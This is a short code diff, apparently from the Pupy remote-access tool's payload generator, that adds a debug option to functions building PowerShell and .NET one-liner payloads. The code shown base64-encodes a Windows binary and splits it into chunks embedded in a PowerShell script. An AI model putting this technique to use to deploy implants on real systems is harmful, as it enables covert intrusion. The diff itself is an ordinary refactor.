@@ -271,7 +271,9 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
         shutil.rmtree(tempdir, ignore_errors=True)
         os.unlink(tempapk)
 
-def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64=False, x86=False, as_str=False):
+def generate_ps1(
+    display, conf, outpath=False, output_dir=False, both=False,
+        x64=False, x86=False, as_str=False, debug=False):
 
     SPLIT_SIZE = 100000
     x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
@@ -299,7 +301,7 @@ def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64
     if both or x64:
         # generate x64 ps1
         binaryX64 = base64.b64encode(
-            generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True)[0])
+            generate_binary_from_template(display, conf, 'windows', arch='x64', shared=True, debug=debug)[0])
         binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
         for i, aPart in enumerate(binaryX64parts):
             x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
@@ -309,7 +311,7 @@ def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64
     if both or x86:
         # generate x86 ps1
         binaryX86 = base64.b64encode(
-            generate_binary_from_template(display, conf, 'windows', arch='x86', shared=True)[0])
+            generate_binary_from_template(display, conf, 'windows', arch='x86', shared=True, debug=debug)[0])
         binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
         for i, aPart in enumerate(binaryX86parts):
             x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
@@ -757,7 +759,8 @@ def pupygen(args, config, pupsrv, display):
     elif args.format == '.NET_oneliner':
         i = conf['launcher_args'].index('--host')+1
         link_ip, _ = conf['launcher_args'][i].split(':',1)
-        rawdll = generate_binary_from_template(display, conf, 'windows', arch=args.arch, shared=True)[0]
+        rawdll = generate_binary_from_template(
+            display, conf, 'windows', arch=args.arch, shared=True, debug=args.debug)[0]
 
         dotnet_serve_payload(display, pupsrv, rawdll, conf, link_ip=link_ip)
 
